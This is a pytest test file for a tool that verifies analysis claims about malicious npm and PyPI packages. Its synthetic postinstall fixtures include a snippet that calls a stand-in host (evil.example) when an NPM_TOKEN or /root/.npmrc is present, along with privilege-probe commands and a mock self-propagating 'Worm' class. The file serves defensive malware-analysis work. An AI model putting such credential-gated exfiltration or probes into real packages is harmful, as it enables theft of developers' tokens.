"""Correct claims the verifier used to refute (or leave open) for structural reasons: OR gates written as
separate statements, tests through variables and helpers, command probes, and sinks reached through
destructured imports or the package's own wrappers. Each asserts the exact verdict."""
import json

import pytest

from tools.analysis import prepare, write_report
from tools.common import contract
from tools.tests.helpers import cite, drop_uncited, sample, tgz
from tools.verify import verify
from tools.verify.source import sample_index


def finished(repo, name, files, conditions, gates, main="index.js", setup=None, with_record=False):
    """Prepares a synthetic package and writes a record whose conditions and gates are given as builders
    taking the work folder (so anchors come from cite.py). `setup(work, rec)` runs before anything is cited (to
    register a decode_spec derivation, say); with_record also returns the written record."""
    eco = "pypi" if main.endswith(".py") else "npm"
    if eco == "npm":
        files = {"package.json": json.dumps({"name": name, "version": "1.0.0",
                                             "scripts": {"postinstall": f"node {main}"}}), **files}
        archive = tgz(files)
    else:
        files = {f"{name}-1.0/{k}": v for k, v in {**files, "PKG-INFO": f"Name: {name}\nVersion: 1.0\n"}.items()}
        archive = tgz(files, prefix="")
    res = prepare.prepare(sample(repo, f"datadog/{eco}/malicious_intent/{name}.tgz", archive), None, None)
    work = repo / "scratch" / res["key"]
    rec = json.loads((work / "record.json").read_text())
    if setup:
        setup(work, rec)
        (work / "record.json").write_text(json.dumps(rec))
    rec["conditions"] = [c(work) for c in conditions]
    rec["gates"] = [g(work) for g in gates]
    gated = sorted({b for g in rec["gates"] for br in (g["then"], g["else"]) if br for b in br["behaviours"]})
    rec.update(requirements=[], behaviours={"ungated": [], "gated": gated},
               obfuscation={"level": "none", "techniques": [], "decoded": None, "unrecovered": []},
               reachability={"needs_remote": False, "endpoints": [{**e, "role": "exfil_sink"}
                                                                  for e in rec["reachability"]["endpoints"]]},
               attack_type="unknown", family_hint=None, claude_assessment="malicious", assessment_reason="x",
               confidence="high")
    rec["package"]["model_name"] = "claude-test"
    drop_uncited(work, rec, reason="other", note="test record built by hand")
    (work / "record.json").write_text(json.dumps(rec))
    (work / "summary.md").write_text("## Summary\n\nx\n\n## Notes\n\nx\n")
    out = contract.read_record(write_report.finish(work))
    v = {v["claim_id"]: v for v in verify.verdicts_for(out, sample_index())}
    return (v, out) if with_record else v


def cond(cid, file, line, text, category, api, operator, value, node_type=None, probe=None,
         value_recovered="plain", derived=None):
    def build(work):
        c = {"id": cid, "category": category, "api": api, "operator": operator, "value": value,
             "value_recovered": value_recovered, "in_scope": True, "provenance": "in_set",
             "sites": [{"candidate": None, "anchor": cite(work, file, line, text, derived=derived, node_type=node_type)}]}
        if probe:
            c["probe"] = probe
        return c
    return build


def guard(file, line, text, conditions, kind="if", arm="then", node_type="if_statement", derived=None):
    return lambda work: {"candidate": None, "kind": kind, "arm": arm, "conditions": conditions,
                         "site": cite(work, file, line, text, derived=derived, node_type=node_type)}


def gate(expression, guards, regions, payload, behaviours, min_conditions=1):
    def build(work):
        return {"gate_id": "g1", "hook": "setup_py" if guards and guards[0](work)["site"]["file"].endswith(".py")
                else "postinstall", "expression": expression, "provenance": "out_of_set",
                "guards": [g(work) for g in guards], "polarity": "activate", "effect": "enables",
                "purpose": "targeting", "purpose_reason": "x",
                "then": {"min_conditions": min_conditions, "behaviours": behaviours, "env_recipe": {},
                         "recipe_guessed_fields": [], "regions": [r(work) for r in regions],
                         "payload": [p(work) for p in payload]},
                "else": None}
    return build


def region(file, line, text, node_type="statement_block", derived=None):
    return lambda work: cite(work, file, line, text, derived=derived, node_type=node_type)


def sink(file, line, text, behaviour, kind, witness=(), derived=None):
    return lambda work: {"behaviour": behaviour, "sink_kind": kind, "sink": cite(work, file, line, text, derived=derived),
                         "witness": [{"hop": h, "anchor": cite(work, file, ln, t, node_type=nt)}
                                     for h, ln, t, nt in witness]}


def assert_verified(v, *ids):
    for cid in ids:
        assert v[cid]["verdict"] == "verified", (cid, v[cid])


OR_GATE = """const fs = require('fs');
const https = require('https');
function send() { https.get('https://evil.example/x'); }
if (process.env.NPM_TOKEN) { send(); }
if (fs.existsSync('/root/.npmrc')) { send(); }
"""


def test_an_or_gate_across_separate_statements_verifies(repo):
    hops = lambda line: [("call", line, "send()", None), ("def", 3, "function send()", "function_declaration")]  # noqa: E731
    v = finished(repo, "or-gate", {"index.js": OR_GATE},
                 [cond("c1", "index.js", 4, "process.env.NPM_TOKEN", "env_var", "process.env.NPM_TOKEN", "truthy",
                       None),
                  cond("c2", "index.js", 5, "fs.existsSync('/root/.npmrc')", "target_artifact", "fs.existsSync",
                       "exists", "/root/.npmrc")],
                 [gate("c1 || c2", [guard("index.js", 4, "if (process.env.NPM_TOKEN)", ["c1"]),
                                    guard("index.js", 5, "if (fs.existsSync", ["c2"])],
                       [region("index.js", 4, "{ send(); }"), region("index.js", 5, "{ send(); }")],
                       [sink("index.js", 3, "https.get('https://evil.example/x')", "exfil", "network", hops(4))],
                       ["exfil"])])
    assert_verified(v, "c1.L1", "c1.L2", "c2.L1", "c2.L2", "g1.then.L3", "g1.L4", "g1.then.L5")
    assert v["g1.L4"]["grade"] == "consistent"


def test_and_claimed_for_an_or_gate_is_refuted_at_l4(repo):
    v = finished(repo, "or-as-and", {"index.js": OR_GATE},
                 [cond("c1", "index.js", 4, "process.env.NPM_TOKEN", "env_var", "process.env.NPM_TOKEN", "truthy",
                       None),
                  cond("c2", "index.js", 5, "fs.existsSync('/root/.npmrc')", "target_artifact", "fs.existsSync",
                       "exists", "/root/.npmrc")],
                 [gate("c1 && c2", [guard("index.js", 4, "if (process.env.NPM_TOKEN)", ["c1"]),
                                    guard("index.js", 5, "if (fs.existsSync", ["c2"])],
                       [region("index.js", 4, "{ send(); }"), region("index.js", 5, "{ send(); }")],
                       [], [], min_conditions=2)])
    assert v["g1.L4"]["verdict"] == "refuted" and v["g1.L4"]["reason_code"] == "expression_mismatch"


BOUND = """const os = require('os');
const fs = require('fs');
const cp = require('child_process');
const isWin = os.platform() === 'win32';
const notMac = !(os.platform() === 'darwin');
const token = process.env.NPM_TOKEN || fs.existsSync('/root/.npmrc');
if (isWin && !notMac) { cp.exec('a'); }
if (token) { cp.exec('b'); }
"""


def test_tests_through_variables_verify(repo):
    v = finished(repo, "bound", {"index.js": BOUND},
                 [cond("c1", "index.js", 4, "os.platform() === 'win32'", "os", "os.platform()", "==", "win32"),
                  cond("c2", "index.js", 5, "os.platform() === 'darwin'", "os", "os.platform()", "==", "darwin")],
                 [gate("c1 && c2", [guard("index.js", 7, "if (isWin", ["c1", "c2"])],
                       [region("index.js", 7, "{ cp.exec('a'); }")],
                       [sink("index.js", 7, "cp.exec('a')", "spawn_process", "exec")], ["spawn_process"],
                       min_conditions=2)])
    # !notMac is !!(darwin): positive ==; isWin is the bound comparison itself
    assert_verified(v, "c1.L1", "c1.L2", "c2.L1", "c2.L2", "g1.then.L3", "g1.L4", "g1.then.L5")


def test_a_merged_credential_variable_is_an_or_of_its_sources(repo):
    v = finished(repo, "merged", {"index.js": BOUND},
                 [cond("c1", "index.js", 6, "process.env.NPM_TOKEN", "env_var", "process.env.NPM_TOKEN", "truthy",
                       None),
                  cond("c2", "index.js", 6, "fs.existsSync('/root/.npmrc')", "target_artifact", "fs.existsSync",
                       "exists", "/root/.npmrc")],
                 [gate("c1 || c2", [guard("index.js", 8, "if (token)", ["c1", "c2"])],
                       [region("index.js", 8, "{ cp.exec('b'); }")],
                       [sink("index.js", 8, "cp.exec('b')", "spawn_process", "exec")], ["spawn_process"])])
    assert_verified(v, "c1.L1", "c2.L1", "g1.then.L3", "g1.L4")
    assert v["c1.L2"]["verdict"] in ("verified", "cannot_tell") and v["c2.L2"]["verdict"] in ("verified", "cannot_tell")


PROBES = """const cp = require('child_process');
if (cp.execSync('id -u').toString().trim() === '0') { cp.exec('a'); }
const out = cp.execSync('ps aux').toString();
if (out !== '') { cp.exec('b'); }
cp.exec('sudo -n true', (err, so) => { if (!err) { cp.exec('c'); } });
"""


def probe(callee, target, accessor):
    return {"kind": "exec", "callee": callee, "target": target, "accessor": accessor}


@pytest.mark.parametrize("line,text,api,operator,value,pr,guard_text", [
    (2, "cp.execSync('id -u').toString().trim() === '0'", "child_process.execSync", "==", "0",
     probe("child_process.execSync", "id -u", "stdout"), "if (cp.execSync"),
    (4, "out !== ''", "child_process.execSync", "exists", None,
     probe("child_process.execSync", "ps aux", "stdout"), "if (out"),
    (5, "!err", "child_process.exec", "exists", None, probe("child_process.exec", "sudo -n true", "error"),
     "if (!err)"),
])
def test_command_probes_verify(repo, line, text, api, operator, value, pr, guard_text):
    v = finished(repo, f"probe{line}", {"index.js": PROBES},
                 [cond("c1", "index.js", line, text, "privilege", api, operator, value, probe=pr)],
                 [gate("c1", [guard("index.js", line, guard_text, ["c1"])], [], [], [])])
    assert_verified(v, "c1.L1", "c1.L2")


def test_a_probe_running_another_command_is_refuted(repo):
    v = finished(repo, "probe-wrong", {"index.js": PROBES},
                 [cond("c1", "index.js", 2, "cp.execSync('id -u').toString().trim() === '0'", "privilege",
                       "child_process.execSync", "==", "0",
                       probe=probe("child_process.execSync", "whoami", "stdout"))],
                 [gate("c1", [guard("index.js", 2, "if (cp.execSync", ["c1"])], [], [], [])])
    assert v["c1.L1"]["verdict"] == "refuted" and v["c1.L1"]["reason_code"] == "api_mismatch"


BUN = """import { $ } from "bun";
if ((await $`sudo -n true`.nothrow()).exitCode === 0) { await $`id`; }
"""


def test_bun_shell_probe_through_a_named_import_verifies(repo):
    v = finished(repo, "bun", {"index.mjs": BUN},
                 [cond("c1", "index.mjs", 2, "(await $`sudo -n true`.nothrow()).exitCode === 0", "privilege",
                       "Bun.$", "exists", None, probe=probe("Bun.$", "sudo -n true", "returncode"))],
                 [gate("c1", [guard("index.mjs", 2, "if ((await", ["c1"])], [], [], [])], main="index.mjs")
    assert_verified(v, "c1.L1", "c1.L2")


SINKS = """const { exec: run } = require('child_process');
class Worm { createRepo(n) { require('https').request({ host: 'x' }); } }
const w = new Worm();
if (process.platform === 'linux') { run('x'); w.createRepo('a'); }
"""


def test_destructured_exec_and_a_wrapper_method_verify_at_l5(repo):
    v = finished(repo, "sinks", {"index.js": SINKS},
                 [cond("c1", "index.js", 4, "process.platform === 'linux'", "os", "process.platform", "==",
                       "linux")],
                 [gate("c1", [guard("index.js", 4, "if (process.platform", ["c1"])],
                       [region("index.js", 4, "{ run('x'); w.createRepo('a'); }")],
                       [sink("index.js", 4, "run('x')", "spawn_process", "exec"),
                        sink("index.js", 4, "w.createRepo('a')", "self_propagation", "network")],
                       ["spawn_process", "self_propagation"])])
    assert_verified(v, "g1.then.L3", "g1.then.L5")


def test_a_wrapper_that_only_spawns_is_not_network(repo):
    src = SINKS.replace("require('https').request({ host: 'x' })", "require('child_process').spawn('y')")
    v = finished(repo, "sinks2", {"index.js": src},
                 [cond("c1", "index.js", 4, "process.platform === 'linux'", "os", "process.platform", "==",
                       "linux")],
                 [gate("c1", [guard("index.js", 4, "if (process.platform", ["c1"])],
                       [region("index.js", 4, "{ run('x'); w.createRepo('a'); }")],
                       [sink("index.js", 4, "w.createRepo('a')", "exfil", "network")], ["exfil"])])
    assert v["g1.then.L5"]["verdict"] == "refuted" and v["g1.then.L5"]["reason_code"] == "sink_kind_mismatch"


SETUP = """import sys
from subprocess import run
from setuptools import setup
if sys.platform == 'linux':
    run(['x'])
setup(name='pyx', version='1.0')
"""


def test_python_from_import_sink_verifies_at_l5(repo):
    def block(work):
        return cite(work, "setup.py", 5, "run(['x'])", node_type="block")
    v = finished(repo, "pyx", {"setup.py": SETUP},
                 [cond("c1", "setup.py", 4, "sys.platform == 'linux'", "os", "sys.platform", "==", "linux")],
                 [gate("c1", [guard("setup.py", 4, "if sys.platform", ["c1"])], [block],
                       [sink("setup.py", 5, "run(['x'])", "spawn_process", "exec")], ["spawn_process"])],
                 main="setup.py")
    assert_verified(v, "c1.L1", "c1.L2", "g1.then.L3", "g1.L4", "g1.then.L5")


@pytest.mark.parametrize("lang, src", [
    ("js", b"function f(p, {q}, r = 1) { return p + q + r; }\ntry {} catch (e) { e; }\n"),
    ("py", b"def f(p, *a, q: int = 1, **k):\n    return p, a, q, k\n"),
])
def test_every_resolver_gap_is_a_verdict_reason_code(lang, src):
    """A parameter's unknown value surfaced as reason_code 'parameter', which no sidecar accepts."""
    from tools.common import paths
    from tools.common.tsparse import PARSERS
    from tools.verify.resolve import Index
    tree = PARSERS[lang].parse(src)
    index = Index(tree, lang)
    allowed = set(json.loads((paths.CODE_ROOT / "schema" / "verification.schema.json").read_text())
                  ["$defs"]["verdict"]["properties"]["reason_code"]["enum"])
    gaps, stack = set(), [tree.root_node]
    while stack:
        n = stack.pop()
        stack += n.children
        if n.type == "identifier":
            gaps.add(index.lookup(n).gap)
    assert gaps - {None} and gaps <= allowed
